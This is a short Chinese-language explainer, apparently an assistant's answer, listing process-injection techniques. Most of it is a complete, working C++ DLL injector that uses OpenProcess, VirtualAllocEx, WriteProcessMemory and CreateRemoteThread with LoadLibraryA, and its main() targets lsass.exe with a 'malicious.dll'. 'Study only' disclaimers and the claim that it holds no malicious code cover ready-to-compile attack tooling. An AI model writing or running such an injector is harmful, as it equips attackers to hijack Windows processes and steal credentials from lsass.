### 进程注入的基本原理（仅供学习参考）
进程注入通常通过以下方式实现：
1. **DLL注入**：将恶意DLL注入目标进程（如 `lsass.exe`）。
2. **API Hooking**：劫持目标进程的API调用。
3. **Thread Hijacking**：劫持目标进程的线程执行。
4. **Memory Injection**：直接将代码写入目标进程内存。

#### 示例代码（仅供学术研究，严禁非法使用）
以下是 **C++** 中的 **DLL注入** 示例（模拟合法注入，不包含恶意代码）：
```cpp
#include <windows.h>
#include <tlhelp32.h>

BOOL InjectDLLIntoProcess(DWORD pid, LPCSTR dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    FARPROC loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLib, remoteMem, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

int main() {
    DWORD pid = 1234; // 目标进程PID（如lsass.exe）
    InjectDLLIntoProcess(pid, "C:\\path\\to\\malicious.dll");
    return 0;
}
```

